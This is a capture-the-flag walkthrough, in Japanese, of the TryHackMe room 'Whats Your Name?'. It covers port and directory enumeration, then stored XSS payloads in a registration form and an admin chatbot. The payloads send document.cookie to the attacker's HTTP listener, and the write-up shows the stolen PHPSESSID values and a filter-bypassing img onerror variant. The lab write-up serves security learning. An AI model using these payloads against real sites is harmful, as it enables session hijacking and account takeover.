# Whats Your Name? CTF

https://tryhackme.com/r/room/whatsyourname

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.214.12

root@ip-10-10-71-145:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-10 00:16 GMT
Nmap scan report for 10.10.214.12
Host is up (0.00015s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8081/tcp open  blackice-icecap
MAC Address: 02:A3:37:5D:F5:79 (Unknown)

root@ip-10-10-71-145:~# sudo nmap -sV -p22,80,8081 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-10 00:17 GMT
Nmap scan report for 10.10.214.12
Host is up (0.00014s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8081/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 02:A3:37:5D:F5:79 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH, 80, 8081 に HTTP

#### 80

HTML ソース

```text
src="../images/friends.jpg
../js/slim.min.js"
```

#### 8081

HTML ソースコメント

```text
<!-- login.php should be updated by Monday for proper redirection -->
```

http://worldwap.thm:8081/login.php でログインフォームが表示される。ユーザー名とパスワード。

### gobuster

#### 80

```shell
root@ip-10-10-71-145:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.214.12
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 70]
/login.php            (Status: 200) [Size: 3108]
/profile.php          (Status: 302) [Size: 0] [--> login.php]
/clear.php            (Status: 200) [Size: 4]
/assets               (Status: 301) [Size: 313] [--> http://10.10.214.12/assets/]
/chat.php             (Status: 302) [Size: 0] [--> login.php]
/db.php               (Status: 200) [Size: 0]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.214.12/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/setup.php            (Status: 200) [Size: 149]
/logs.txt             (Status: 200) [Size: 0]
/block.php            (Status: 200) [Size: 15]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.214.12/phpmyadmin/]
/.php                 (Status: 403) [Size: 277]
/change_password.php  (Status: 302) [Size: 4] [--> login.php]
/server-status        (Status: 403) [Size: 277]
Progress: 661671 / 661674 (100.00%)
===============================================================
Finished
===============================================================
```

#### 8081

```shell
root@ip-10-10-71-145:~# gobuster dir -x=txt,php -u http://$TARGET:8081 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.214.12:8081
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 70]
/login.php            (Status: 200) [Size: 3108]
/profile.php          (Status: 302) [Size: 0] [--> login.php]
/assets               (Status: 301) [Size: 320] [--> http://10.10.214.12:8081/assets/]
/chat.php             (Status: 302) [Size: 0] [--> login.php]
/clear.php            (Status: 200) [Size: 4]
/db.php               (Status: 200) [Size: 0]
/javascript           (Status: 301) [Size: 324] [--> http://10.10.214.12:8081/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/setup.php            (Status: 200) [Size: 149]
/logs.txt             (Status: 200) [Size: 0]
/block.php            (Status: 200) [Size: 15]
/phpmyadmin           (Status: 301) [Size: 324] [--> http://10.10.214.12:8081/phpmyadmin/]
/.php                 (Status: 403) [Size: 279]
/change_password.php  (Status: 302) [Size: 4] [--> login.php]
/server-status        (Status: 403) [Size: 279]
Progress: 661671 / 661674 (100.00%)
===============================================================
Finished
===============================================================
```

ログインページ。どちらも CSRF トークンの設定は無い。

http://worldwap.thm/public/html/login.php

Register リンク付き。  
→ 　「You need to visit login.worldwap.thm to login once you register successfully」

http://worldwap.thm:8081/login.php

## ユーザー登録画面

http://worldwap.thm/public/html/register.php

```text
You can now pre-register! Your details will be reviewed by the site moderator.
```

モデレータが確認すると書かれているので、XSS でクッキーを盗む方針で。

```text
Username:thm
Password:p123
Email:thm@thm.com
Name: <script>document.write('<img src="http://10.2.22.182:8888/' + document.cookie + '">')</script>
```

PHPSESSID を盗めた。

```shell
$ sudo python3 -m http.server 8888
[sudo] password for kali:
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.214.12 - - [09/Jan/2025 19:43:33] code 404, message File not found
10.10.214.12 - - [09/Jan/2025 19:43:33] "GET /PHPSESSID=d2ordjdlh73q6n5q65cogt53u6 HTTP/1.1" 404 -
```

セッション ID を設定し、8081 ポートのログイン画面へ行くとモデレータとしてログインできた。  
フラグ１ゲット。

## チャット画面

AdminBot とのチャット画面。  
チャットを入力、Bot が表示、セッションクッキーを送信させる方針で。

HTML ソースのスクリプト。  
messageDiv.innerHTML = msg.message; で新しいメッセージをセットしている。

```javascript
<script>
document.addEventListener("DOMContentLoaded", function() {
    let chatDisplay = document.querySelector(".chat-display"); // Select the chat display container

    // Function to create and return a chat message element
    function createChatMessageElement(msg, isSent) {
        // Create the container div and apply sent or received class
        const chatMessage = document.createElement("div");
        chatMessage.classList.add("chat-message", isSent ? "sent" : "received");

        // Create the message div and set its text
        const messageDiv = document.createElement("div");
        messageDiv.classList.add("message");
        messageDiv.innerHTML = msg.message; // Set the inner HTML to the message text

        // Create the timestamp div and set its text
        const timestampDiv = document.createElement("div");
        timestampDiv.classList.add("timestamp");
        timestampDiv.textContent = new Date(msg.created_at).toLocaleTimeString(); // Format the timestamp

        // Append the message and timestamp to the container
        chatMessage.appendChild(messageDiv);
        chatMessage.appendChild(timestampDiv);

        return chatMessage;
    }

    // Function to fetch new messages
    function fetchMessages() {
        const lastMessageTime = chatDisplay.querySelector(".chat-message:last-child .timestamp")?.textContent || '1970-01-01 00:00:00';

        fetch(`fetch_messages.php?lastMessageTime=${lastMessageTime}`)
            .then(response => response.json())
            .then(data => {
                data.forEach(msg => {
                    // Determine if the message is sent by the logged-in user
                    const isSent = msg.username === 'moderator';
                    const messageElement = createChatMessageElement(msg, isSent);
                    chatDisplay.appendChild(messageElement); // Append the message element to the chat display
                });
            })
            .catch(error => console.error('Error fetching messages:', error));
    }

    setInterval(fetchMessages, 5000); // Fetch new messages every 5 seconds
});
</script>
```

### ペイロード

```text
<script>document.write('<img src="http://10.2.22.182:8889/' + document.cookie + '">')</script>
```

↑ は実行されなかったが、まあ予想通り。

```text
<img src="x" onerror="fetch('http://10.2.22.182:8889/?cookie=' + btoa(document.cookie) );" />
```

fetch は何らかのフィルターがかかっているようで、構造が壊されてしまう。

```text
<img src=x onerror=this.src="http://10.2.22.182:8889/?c="+document.cookie>
```

これはうまくいった。

```shell
┌──(kali㉿kali)-[~/CTF]
└─$ sudo python3 -m http.server 8889
[sudo] password for kali:
Serving HTTP on 0.0.0.0 port 8889 (http://0.0.0.0:8889/) ...
10.10.214.12 - - [09/Jan/2025 20:19:24] "GET /?c=PHPSESSID=64h5pe4097ciufr9c4ahb5pqfq HTTP/1.1" 200 -
10.10.214.12 - - [09/Jan/2025 20:19:24] "GET /?c=PHPSESSID=64h5pe4097ciufr9c4ahb5pqfq HTTP/1.1" 200 -
```

セッション ID を変更すると Admin として画面表示された。  
フラグ２ゲット！

## 振り返り

- 基本的な XSS
- Client Side Attack の最終テストという認識があったから非常に簡単に感じたけど、そのコンテキストでなければ、いろいろ迷ったのかもしれない。
- img の onerror では、一部はフィルターされていた。ペンテストでは、知られているパターンを網羅するのが大事というのがよく分かる。
